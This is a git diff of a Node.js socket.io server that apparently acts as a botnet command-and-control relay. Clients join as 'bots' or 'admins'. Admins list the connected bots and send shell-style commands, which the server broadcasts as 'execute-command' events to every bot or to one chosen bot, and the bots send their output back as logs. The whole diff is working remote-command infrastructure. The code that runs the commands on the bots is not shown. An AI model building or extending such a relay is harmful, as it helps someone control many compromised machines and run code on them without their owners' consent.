@@ -1,5 +1,3 @@
-import { executeCommand } from "./commands-handler.js";
-
 import express from "express";
 const app = express();
 
@@ -32,21 +30,78 @@ app.use(cors(corsOptions));
   res.send("Hello");
 });*/
 
+const connectedBots = new Set();
+
 //Whenever someone connects this gets executed
 io.on("connection", function (socket) {
-  console.log("User connected");
+
+  const role = socket.request._query.role;
+
+  if (role == "bot") {
+    console.log("Bot " + socket.id + " connected");
+    io.to("admins").emit("log", "Bot " + socket.id + " connected");
+
+    connectedBots.add(socket.id);
+    socket.join("bots");
+  } else if (role == "admin") {
+    console.log("New admin connected");
+    io.to("admins").emit("log", "New admin connected");
+
+    socket.join("admins");
+  }
 
   //Whenever someone disconnects this piece of code executed
   socket.on("disconnect", function () {
-    console.log("User disconnected");
+    if (role == "bot") {
+      console.log("Bot " + socket.id + " disconnected");
+      io.to("admins").emit("log", "Bot " + socket.id + " disconnected");
+      connectedBots.delete(socket.id);
+    } else if (role == "admin") {
+      console.log("Admin disconnected");
+      io.to("admins").emit("log", "Admin disconnected");
+    }
   });
 
   socket.on("send-command", (command) => {
-    executeCommand(command);
+    if (role == "bot") {
+      return;
+    }
+    if (role == "admin") {
+      console.log("command is: " + command);
+      if (command == "list") {
+        let ids = "";
+        connectedBots.forEach((id) => (ids += id + "\n"));
+        io.to("admins").emit("log", "Connected bots \n" + ids);
+        return;
+      }
+      handleCommand(command);
+    }
+  });
+
+  socket.on("log", (log) => {
+    if (role == "bot") {
+      io.to("admins").emit("log", "bot " + socket.id + " " + log);
+    }
   });
 
   socket.on("error", () => {});
 });
+
+function handleCommand(command) {
+  const args = command.split(" ");
+  if (args[0] == "bot") {
+    if (args.length <= 1) {
+      io.to("admins").emit("unexisting bot");
+      return;
+    }
+    const id = args[1];
+    args.splice(0, 2);
+    console.log("emitting to: " + id + " " + args.join(" "));
+    io.to(id).emit("execute-command", args.join(" "));
+    return;
+  }
+  io.to("bots").emit("execute-command", command);
+}
 
 httpServer.listen(8080, function () {
   console.log("listening on port 8080");
